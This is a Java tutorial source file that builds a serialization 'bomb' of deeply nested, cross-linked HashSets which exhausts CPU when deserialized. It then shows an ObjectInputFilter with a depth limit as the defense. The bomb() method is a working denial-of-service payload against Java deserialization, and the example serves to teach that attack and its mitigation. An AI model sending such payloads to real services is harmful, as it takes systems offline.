package com.mkyong.io.object.attack;

import java.io.*;
import java.util.HashSet;
import java.util.Set;

//https://homepages.ecs.vuw.ac.nz/~alex/files/DietrichJezekRasheedTahirPotaninECOOP2017.pdf
public class DosExample {

    public static void main(String[] args) throws Exception {
        System.out.println(bomb().length);

        //deserialize(bomb());  // Dos here

        ObjectInputFilter filter =
                ObjectInputFilter.Config.createFilter(
                        "maxdepth=10;java.base/*;!*");

        deserializeFilter(bomb(), filter);  // Dos here

        System.out.println("Done");
    }

    static byte[] bomb() {
        Set<Object> root = new HashSet<>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<>();
        for (int i = 0; i < 100; i++) {
            Set<Object> t1 = new HashSet<>();
            Set<Object> t2 = new HashSet<>();
            t1.add("test-" + i); // make it not equal to t2

            s1.add(t1); // root also add set
            s1.add(t2);

            s2.add(t1);
            s2.add(t2);

            s1 = t1;    // reference to t1, so that `root` can add new set from the last t1
            s2 = t2;
        }
        return serialize(root);
    }

    public static byte[] serialize(Object o) {
        ByteArrayOutputStream ba = new ByteArrayOutputStream();
        try {
            new ObjectOutputStream(ba).writeObject(o);
        } catch (IOException e) {
            throw new IllegalArgumentException(e);
        }
        return ba.toByteArray();
    }

    /*public static Object deserialize(byte[] bytes) {
        try {
            return new ObjectInputStream(
                    new ByteArrayInputStream(bytes)).readObject();
        } catch (IOException | ClassNotFoundException e) {
            throw new IllegalArgumentException(e);
        }
    }*/

    public static Object deserializeFilter(byte[] bytes, ObjectInputFilter filter) {

        try (ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
             ObjectInputStream ois = new ObjectInputStream(bais)) {

            // add filter before readObject
            ois.setObjectInputFilter(filter);

            return ois.readObject();
        } catch (IOException | ClassNotFoundException e) {
            throw new IllegalArgumentException(e);
        }

    }

}